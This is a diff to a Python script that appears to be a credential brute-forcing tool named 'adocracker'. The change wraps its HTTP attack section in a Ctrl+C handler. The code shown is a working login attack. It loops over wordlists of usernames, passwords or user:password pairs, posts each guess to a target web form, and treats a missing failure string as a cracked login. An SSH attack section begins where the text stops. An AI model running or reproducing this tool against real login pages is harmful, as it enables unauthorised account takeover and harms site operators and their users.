@@ -33,116 +33,120 @@ if len(sys.argv) < 2:
 
 # Attacking HTTP Service
 if args.service == "http":
-    target = args.attack
-    username = args.login
-    username_file = args.login_file
-    colon_file = args.colon_file
-    password = args.password
-    password_file = args.password_file
-    response = args.response
-    form1 = args.username_form
-    form2 = args.password_form
+    try:
+        target = args.attack
+        username = args.login
+        username_file = args.login_file
+        colon_file = args.colon_file
+        password = args.password
+        password_file = args.password_file
+        response = args.response
+        form1 = args.username_form
+        form2 = args.password_form
 
-    if "://" not in target:
-        print("Target must start with http:// or https://")
-        exit(0)
-
-    # When single password provided
-    if args.password in sys.argv:
-        print("\033[1;34m------------------------------"
-              "\n     adocracker is started      "
-              "\n  Take a cup of coffee and wait"
-              "\n------------------------------")
-        file = open(username_file)
-        user_list = file.readlines()
-
-        for user in user_list:
-            user = user.rstrip()
-
-            if args.verbose in sys.argv:
-                if args.verbose != "show":
-                    break
-
-                print('\033[1;37m''[+]', user, '_', password)
-            post = {f'{form1}': user, f'{form2}': password, 'submit': "Submit"}
-            re = requests.post(target, data=post)
-            if args.response in re.text:
-                pass
-            else:
-                print("\n\033[1;92m-----------------------------------------"
-                      "\n Username found:", user,
-                      "\n-----------------------------------------")
-                break
-        else:
-            print("------------------------------------------------------------------"
-                  "\n Sorry No password or username found on your wordlist"
-                  "\n Please provide wordlist with more words to increase your chance"
-                  "\n----------------------------------------------------------------")
+        if "://" not in target:
+            print("Target must start with http:// or https://")
             exit(0)
 
-    # When colon file is provided
-    elif args.colon_file in sys.argv:
-        print("\033[1;34m------------------------------"
-              "\n     adocracker is started      "
-              "\n  Take a cup of coffee and wait"
-              "\n------------------------------")
-        file = open(colon_file)
-        for line in file.readlines():
-            if ":" in line:
-                user = line.split(':')[0]
-                pwd = line.split(':')[1]
+        # When single password provided
+        if args.password in sys.argv:
+            print("\033[1;34m------------------------------"
+                  "\n     adocracker is started      "
+                  "\n  Take a cup of coffee and wait"
+                  "\n------------------------------")
+            file = open(username_file)
+            user_list = file.readlines()
+
+            for user in user_list:
+                user = user.rstrip()
+
                 if args.verbose in sys.argv:
                     if args.verbose != "show":
                         break
-                    print('\033[1;37m''[+]', user, '_', pwd)
-                post = {f'{form1}': user, f'{form2}': pwd.strip(), 'submit': "Submit"}
+
+                    print('\033[1;37m''[+]', user, '_', password)
+                post = {f'{form1}': user, f'{form2}': password, 'submit': "Submit"}
                 re = requests.post(target, data=post)
-                if args.response in re.text:  # Change this according to the server respond when login attempt failed
+                if args.response in re.text:
                     pass
                 else:
-                    print("\n\033[1;92m-----------------------------------------------------------"
-                          "\n Username and Password found:", user, "=>", pwd,
-                         "----------------------------------------------------------")
+                    print("\n\033[1;92m-----------------------------------------"
+                          "\n Username found:", user,
+                          "\n-----------------------------------------")
                     break
             else:
-                print(" ---------------------------------------------------------------------"
-                        "\n Sorry No password or username found on your wordlist"
-                         "\n Please provide wordlist with more words to increase your chance"
-                        "\n-----------------------------------------------------------------")
+                print("------------------------------------------------------------------"
+                      "\n Sorry No password or username found on your wordlist"
+                      "\n Please provide wordlist with more words to increase your chance"
+                      "\n----------------------------------------------------------------")
                 exit(0)
 
-    # When password file provided
-    else:
-        print("\033[1;34m------------------------------"
-              "\n     adocracker is started      "
-              "\n  Take a cup of coffee and wait"
-              "\n------------------------------")
-        file = open(password_file)
-        pwd_list = file.readlines()
+        # When colon file is provided
+        elif args.colon_file in sys.argv:
+            print("\033[1;34m------------------------------"
+                  "\n     adocracker is started      "
+                  "\n  Take a cup of coffee and wait"
+                  "\n------------------------------")
+            file = open(colon_file)
+            for line in file.readlines():
+                if ":" in line:
+                    user = line.split(':')[0]
+                    pwd = line.split(':')[1]
+                    if args.verbose in sys.argv:
+                        if args.verbose != "show":
+                            break
+                        print('\033[1;37m''[+]', user, '_', pwd)
+                    post = {f'{form1}': user, f'{form2}': pwd.strip(), 'submit': "Submit"}
+                    re = requests.post(target, data=post)
+                    if args.response in re.text:  # Change this according to the server respond when login attempt failed
+                        pass
+                    else:
+                        print("\n\033[1;92m-----------------------------------------------------------"
+                              "\n Username and Password found:", user, "=>", pwd,
+                             "----------------------------------------------------------")
+                        break
+                else:
+                    print(" ---------------------------------------------------------------------"
+                            "\n Sorry No password or username found on your wordlist"
+                             "\n Please provide wordlist with more words to increase your chance"
+                            "\n-----------------------------------------------------------------")
+                    exit(0)
 
-        for pwd in pwd_list:
-            pwd = pwd.rstrip()
-
-            if args.verbose in sys.argv:
-                if args.verbose != "show":
-                    break
-
-                print('\033[1;37m''[+]', username, '_', pwd)
-            post = {f'{form1}': username, f'{form2}': pwd, 'submit': "Submit"}
-            re = requests.post(target, data=post)
-            if args.response in re.text: # Change this according to the server respond when login attempt failed
-                pass
-            else:
-                print("\n\033[1;92m-----------------------------------------"
-                      "\n Password found:", pwd,
-                      "\n------------------------------------------")
-                break
+        # When password file provided
         else:
-            print("------------------------------------------------------------------"
-                  "\n Sorry No password or username found on your wordlist"
-                  "\n Please provide wordlist with more words to increase your chance"
-                  "\n----------------------------------------------------------------")
-            exit(0)
+            print("\033[1;34m------------------------------"
+                  "\n     adocracker is started      "
+                  "\n  Take a cup of coffee and wait"
+                  "\n------------------------------")
+            file = open(password_file)
+            pwd_list = file.readlines()
+
+            for pwd in pwd_list:
+                pwd = pwd.rstrip()
+
+                if args.verbose in sys.argv:
+                    if args.verbose != "show":
+                        break
+
+                    print('\033[1;37m''[+]', username, '_', pwd)
+                post = {f'{form1}': username, f'{form2}': pwd, 'submit': "Submit"}
+                re = requests.post(target, data=post)
+                if args.response in re.text: # Change this according to the server respond when login attempt failed
+                    pass
+                else:
+                    print("\n\033[1;92m-----------------------------------------"
+                          "\n Password found:", pwd,
+                          "\n------------------------------------------")
+                    break
+            else:
+                print("------------------------------------------------------------------"
+                      "\n Sorry No password or username found on your wordlist"
+                      "\n Please provide wordlist with more words to increase your chance"
+                      "\n----------------------------------------------------------------")
+                exit(0)
+    except KeyboardInterrupt:
+        print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
+        exit(0)
 
 # Attacking SSH
 if args.service == "ssh":
